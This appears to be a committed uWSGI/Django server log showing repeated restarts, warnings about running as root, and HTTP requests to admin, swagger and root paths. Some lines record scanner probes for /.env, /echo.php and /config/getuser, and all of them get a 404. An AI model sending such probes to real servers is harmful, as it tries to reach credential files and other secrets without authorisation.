+[pid: 8|app: 0|req: 25/25] 220.123.151.127 () {46 vars in 1229 bytes} [Wed Mar 24 05:32:55 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /srv/docker-server
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 3 mapped to socket 0 (/srv/docker-server/apps.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Mar 24 05:33:15 2021] ***
+compiled with version: 8.3.0 on 24 March 2021 05:22:51
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: f51670579935
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /srv/docker-server/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x5560d194d2f0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5560d194d2f0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 11, cores: 2)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Mar 24 05:35:43 2021] ***
+compiled with version: 8.3.0 on 24 March 2021 05:35:03
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: 3d346cc429aa
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x5649505fa320
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5649505fa320 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 9, cores: 2)
+Not Found: /
+Not Found: /
+[pid: 9|app: 0|req: 2/1] 220.123.151.127 () {46 vars in 1227 bytes} [Wed Mar 24 05:35:56 2021] GET / => generated 2797 bytes in 40 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+[pid: 9|app: 0|req: 2/2] 220.123.151.127 () {44 vars in 1180 bytes} [Wed Mar 24 05:35:55 2021] GET / => generated 2797 bytes in 359 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /accouts
+[pid: 9|app: 0|req: 3/3] 220.123.151.127 () {42 vars in 1163 bytes} [Wed Mar 24 05:36:04 2021] GET /accouts => generated 2836 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+[pid: 9|app: 0|req: 4/4] 220.123.151.127 () {44 vars in 1086 bytes} [Wed Mar 24 05:36:08 2021] GET /admin/ => generated 0 bytes in 11 msecs (HTTP/1.1 302) 9 headers in 339 bytes (1 switches on core 0)
+[pid: 9|app: 0|req: 5/5] 220.123.151.127 () {44 vars in 1123 bytes} [Wed Mar 24 05:36:08 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 29 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 1)
+[pid: 9|app: 0|req: 6/6] 220.123.151.127 () {42 vars in 1062 bytes} [Wed Mar 24 05:36:08 2021] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 9 headers in 339 bytes (1 switches on core 0)
+[pid: 9|app: 0|req: 7/7] 220.123.151.127 () {42 vars in 1099 bytes} [Wed Mar 24 05:36:08 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 14 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 1)
+[pid: 9|app: 0|req: 8/8] 220.123.151.127 () {42 vars in 1198 bytes} [Wed Mar 24 05:36:19 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 13 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 0)
+Not Found: /admin/l
+[pid: 9|app: 0|req: 9/9] 220.123.151.127 () {42 vars in 1163 bytes} [Wed Mar 24 05:36:24 2021] GET /admin/l => generated 4405 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+[pid: 9|app: 0|req: 10/10] 220.123.151.127 () {42 vars in 1066 bytes} [Wed Mar 24 05:36:26 2021] GET /swagger/ => generated 2218 bytes in 6 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 0)
+Not Found: /echo.php
+[pid: 9|app: 0|req: 11/11] 5.188.210.227 () {46 vars in 653 bytes} [Wed Mar 24 05:42:36 2021] GET /echo.php => generated 2835 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Bad Request: /accounts/login/
+[pid: 9|app: 0|req: 12/12] 220.123.151.127 () {40 vars in 654 bytes} [Wed Mar 24 05:43:50 2021] POST /accounts/login/ => generated 89 bytes in 3 msecs (HTTP/1.1 400) 7 headers in 210 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 9|app: 0|req: 13/13] 35.165.191.186 () {36 vars in 512 bytes} [Wed Mar 24 05:47:50 2021] GET /.env => generated 2821 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 9|app: 0|req: 14/14] 35.165.191.186 () {40 vars in 619 bytes} [Wed Mar 24 05:47:50 2021] POST / => generated 2792 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /srv/docker-server
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 3 mapped to socket 0 (/srv/docker-server/apps.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Mar 24 05:48:04 2021] ***
+compiled with version: 8.3.0 on 24 March 2021 05:35:03
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: 3d346cc429aa
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /srv/docker-server/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x56097ee8d2f0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x56097ee8d2f0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 12, cores: 2)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Mar 24 05:50:12 2021] ***
+compiled with version: 8.3.0 on 24 March 2021 05:35:03
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: a7b722851755
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x56363a897320
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x56363a897320 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 8, cores: 2)
+Not Found: /
+[pid: 8|app: 0|req: 1/1] 220.123.151.127 () {46 vars in 1215 bytes} [Wed Mar 24 05:50:34 2021] GET / => generated 2797 bytes in 347 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 2/2] 220.123.151.127 () {42 vars in 1051 bytes} [Wed Mar 24 05:50:47 2021] GET / => generated 2797 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 8|app: 0|req: 3/3] 220.123.151.127 () {46 vars in 1129 bytes} [Wed Mar 24 05:50:48 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 4/4] 220.123.151.127 () {44 vars in 1087 bytes} [Wed Mar 24 05:50:50 2021] GET /admin/ => generated 0 bytes in 11 msecs (HTTP/1.1 302) 9 headers in 339 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 5/5] 220.123.151.127 () {44 vars in 1124 bytes} [Wed Mar 24 05:50:50 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 31 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 6/6] 220.123.151.127 () {42 vars in 1063 bytes} [Wed Mar 24 05:50:51 2021] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 9 headers in 339 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 7/7] 220.123.151.127 () {42 vars in 1100 bytes} [Wed Mar 24 05:50:51 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 14 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Mar 24 06:07:22 2021] ***
+compiled with version: 8.3.0 on 24 March 2021 06:06:34
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: 17242f60266e
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x55794b279320
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55794b279320 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 8, cores: 2)
+Not Found: /
+[pid: 8|app: 0|req: 1/1] 220.123.151.127 () {46 vars in 1215 bytes} [Wed Mar 24 06:07:44 2021] GET / => generated 2797 bytes in 350 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 2/2] 220.123.151.127 () {42 vars in 1198 bytes} [Wed Mar 24 06:07:51 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 40 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 3/3] 220.123.151.127 () {44 vars in 1227 bytes} [Wed Mar 24 06:07:53 2021] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 9 headers in 339 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 4/4] 220.123.151.127 () {44 vars in 1264 bytes} [Wed Mar 24 06:07:53 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 14 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 5/5] 220.123.151.127 () {44 vars in 1227 bytes} [Wed Mar 24 06:07:53 2021] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 9 headers in 339 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 6/6] 220.123.151.127 () {44 vars in 1264 bytes} [Wed Mar 24 06:07:53 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 12 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 7/7] 220.123.151.127 () {44 vars in 1264 bytes} [Wed Mar 24 06:07:54 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 13 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 8/8] 220.123.151.127 () {42 vars in 1198 bytes} [Wed Mar 24 06:07:55 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 13 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 9/9] 220.123.151.127 () {42 vars in 1198 bytes} [Wed Mar 24 06:07:59 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 13 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 10/10] 220.123.151.127 () {42 vars in 1163 bytes} [Wed Mar 24 06:08:03 2021] GET /swagger => generated 0 bytes in 1 msecs (HTTP/1.1 301) 6 headers in 191 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 11/11] 220.123.151.127 () {42 vars in 1165 bytes} [Wed Mar 24 06:08:03 2021] GET /swagger/ => generated 2218 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 0)
+Method Not Allowed: /accounts/login/
+[pid: 8|app: 0|req: 12/12] 220.123.151.127 () {44 vars in 1257 bytes} [Wed Mar 24 06:08:05 2021] GET /accounts/login/?next=/swagger/ => generated 7763 bytes in 21 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 1)
+Not Found: /
+[pid: 8|app: 0|req: 13/13] 220.123.151.127 () {44 vars in 1180 bytes} [Wed Mar 24 06:13:25 2021] GET / => generated 2797 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 14/14] 220.123.151.127 () {46 vars in 1227 bytes} [Wed Mar 24 06:13:25 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Bad Request: /accounts/login/
+[pid: 8|app: 0|req: 15/15] 220.123.151.127 () {40 vars in 654 bytes} [Wed Mar 24 06:15:03 2021] POST /accounts/login/ => generated 89 bytes in 2 msecs (HTTP/1.1 400) 7 headers in 210 bytes (1 switches on core 0)
+Not Found: /config/getuser
+[pid: 8|app: 0|req: 16/16] 205.185.122.102 () {40 vars in 661 bytes} [Wed Mar 24 06:16:07 2021] GET /config/getuser?index=0 => generated 2862 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 8|app: 0|req: 17/17] 220.123.151.127 () {44 vars in 1180 bytes} [Wed Mar 24 06:17:22 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 18/18] 220.123.151.127 () {46 vars in 1227 bytes} [Wed Mar 24 06:17:23 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 8|app: 0|req: 19/19] 220.123.151.127 () {44 vars in 1180 bytes} [Wed Mar 24 06:17:24 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 20/20] 220.123.151.127 () {46 vars in 1227 bytes} [Wed Mar 24 06:17:25 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 8|app: 0|req: 21/21] 220.123.151.127 () {44 vars in 1180 bytes} [Wed Mar 24 06:17:25 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 22/22] 220.123.151.127 () {46 vars in 1227 bytes} [Wed Mar 24 06:17:25 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 8|app: 0|req: 23/23] 220.123.151.127 () {44 vars in 1180 bytes} [Wed Mar 24 06:17:26 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 24/24] 220.123.151.127 () {46 vars in 1227 bytes} [Wed Mar 24 06:17:26 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 8|app: 0|req: 25/25] 220.123.151.127 () {44 vars in 1180 bytes} [Wed Mar 24 06:17:26 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 26/26] 220.123.151.127 () {44 vars in 1180 bytes} [Wed Mar 24 06:17:27 2021] GET / => generated 2797 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 8|app: 0|req: 27/27] 220.123.151.127 () {46 vars in 1227 bytes} [Wed Mar 24 06:17:27 2021] GET / => generated 2797 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 28/28] 220.123.151.127 () {44 vars in 1180 bytes} [Wed Mar 24 06:17:27 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 29/29] 220.123.151.127 () {42 vars in 1161 bytes} [Wed Mar 24 06:17:52 2021] GET /static => generated 0 bytes in 1 msecs (HTTP/1.1 301) 6 headers in 190 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 30/30] 220.123.151.127 () {42 vars in 1149 bytes} [Wed Mar 24 06:19:55 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 8|app: 0|req: 31/31] 220.123.151.127 () {46 vars in 1227 bytes} [Wed Mar 24 06:19:56 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 32/32] 220.123.151.127 () {46 vars in 1215 bytes} [Wed Mar 24 06:22:29 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 33/33] 220.123.151.127 () {42 vars in 1165 bytes} [Wed Mar 24 06:22:33 2021] GET /swagger/ => generated 2218 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 34/34] 220.123.151.127 () {44 vars in 1177 bytes} [Wed Mar 24 06:22:34 2021] GET /swagger/?format=openapi => generated 4720 bytes in 12 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 35/35] 23.22.16.221 () {36 vars in 482 bytes} [Wed Mar 24 06:22:35 2021] GET /swagger/?format=openapi => generated 4720 bytes in 11 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 36/36] 220.123.151.127 () {42 vars in 1161 bytes} [Wed Mar 24 06:23:18 2021] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 9 headers in 339 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 37/37] 220.123.151.127 () {42 vars in 1198 bytes} [Wed Mar 24 06:23:18 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 13 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 0)
+Not Found: /admin/l
+[pid: 8|app: 0|req: 38/38] 220.123.151.127 () {42 vars in 1065 bytes} [Wed Mar 24 06:28:33 2021] GET /admin/l => generated 4405 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 39/39] 220.123.151.127 () {44 vars in 1087 bytes} [Wed Mar 24 06:28:36 2021] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 9 headers in 339 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 40/40] 220.123.151.127 () {44 vars in 1124 bytes} [Wed Mar 24 06:28:36 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 13 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 41/41] 220.123.151.127 () {42 vars in 1063 bytes} [Wed Mar 24 06:28:36 2021] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 9 headers in 339 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 42/42] 220.123.151.127 () {42 vars in 1100 bytes} [Wed Mar 24 06:28:36 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 13 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 43/43] 220.123.151.127 () {44 vars in 1091 bytes} [Wed Mar 24 06:28:41 2021] GET /swagger/ => generated 2218 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 44/44] 220.123.151.127 () {44 vars in 1079 bytes} [Wed Mar 24 06:28:42 2021] GET /swagger/?format=openapi => generated 4720 bytes in 10 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 45/45] 23.22.16.221 () {36 vars in 482 bytes} [Wed Mar 24 06:28:43 2021] GET /swagger/?format=openapi => generated 4720 bytes in 11 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 0)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /srv/docker-server
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 3 mapped to socket 0 (/srv/docker-server/apps.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Mar 24 06:29:52 2021] ***
+compiled with version: 8.3.0 on 24 March 2021 06:06:34
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: 17242f60266e
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /srv/docker-server/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x5561c53a42f0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5561c53a42f0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 29, cores: 2)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Mar 24 08:32:31 2021] ***
+compiled with version: 8.3.0 on 24 March 2021 08:31:49
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: 2566c8375726
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x56456508f320
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
